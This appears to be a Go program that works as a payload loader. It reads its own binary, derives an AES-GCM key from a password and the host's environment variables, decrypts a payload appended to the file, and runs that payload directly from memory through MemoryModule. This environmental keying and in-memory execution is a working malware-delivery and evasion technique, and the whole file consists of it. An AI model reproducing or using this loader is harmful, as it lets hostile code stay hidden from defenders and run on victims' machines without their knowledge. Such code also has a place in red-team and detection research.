package main

/*
#cgo CFLAGS: -IMemoryModule
#cgo LDFLAGS: MemoryModule/build/MemoryModule.a
#include "MemoryModule/MemoryModule.h"
*/
import "C"

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"unsafe"
)

func main() {

	// read in args
	passwordPtr := flag.String("password", "", "optional password")
	flag.Parse()

	// read in self
	imagePath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	selfBytes, err := ioutil.ReadFile(imagePath)
	if err != nil {
		panic(err)
	}

	// find the magic string (last 64 charaters of file)
	magic := string(selfBytes[len(selfBytes)-64:])

	// search image on disk for magic string
	re, err := regexp.Compile(magic)
	if err != nil {
		log.Fatalln(err)
	}

	// get indexes of env list and payload offset
	indexes := re.FindAllIndex(selfBytes, -1)
	envKeyStartIndex := indexes[len(indexes)-3][1]
	envKeyStopIndex := indexes[len(indexes)-2][0]
	payloadOffset := indexes[len(indexes)-2][1]

	// get list of env keys used to construct encryption key
	envKeyStr := string(selfBytes[envKeyStartIndex:envKeyStopIndex])
	envKeys := strings.Split(envKeyStr, ":")

	encKey := fmt.Sprintf("password:%s", *passwordPtr)
	for _, v := range envKeys {
		encKey = fmt.Sprintf("%s:%s:%s", encKey, strings.ToLower(v), strings.ToLower(os.Getenv(v)))
	}
	encKeySha256 := sha256.Sum256([]byte(encKey))

	// create and launch payload
	ciphertext := selfBytes[payloadOffset:len(selfBytes)-64]

	// Decrypt Payload
	c, err := aes.NewCipher(encKeySha256[:])
	if err != nil {
		log.Fatalln(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		log.Fatalln(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		log.Fatalln(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	payload, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		log.Fatalln(err)
	}

	// convert the args passed to this program into a C array of C strings
	var cArgs []*C.char
	os.Args = append([]string{os.Args[0]}, flag.Args()...)
	for _, goString := range os.Args {
		cArgs = append(cArgs, C.CString(goString))
	}

	// load the reconstructed binary from memory
	handle := C.MemoryLoadLibraryEx(
		unsafe.Pointer(&payload[0]),               // void *data
		(C.size_t)(len(payload)),                  // size_t
		(*[0]byte)(C.MemoryDefaultAlloc),          // Alloc func ptr
		(*[0]byte)(C.MemoryDefaultFree),           // Free func ptr
		(*[0]byte)(C.MemoryDefaultLoadLibrary),    // loadLibrary func ptr
		(*[0]byte)(C.MemoryDefaultGetProcAddress), // getProcAddress func ptr
		(*[0]byte)(C.MemoryDefaultFreeLibrary),    // freeLibrary func ptr
		unsafe.Pointer(&cArgs[0]),                 // void *userdata
	)

	// execute payload
	res := C.MemoryCallEntryPoint(handle)
	fmt.Printf("Output: %v\n", res)

	// cleanup
	C.MemoryFreeLibrary(handle)

}
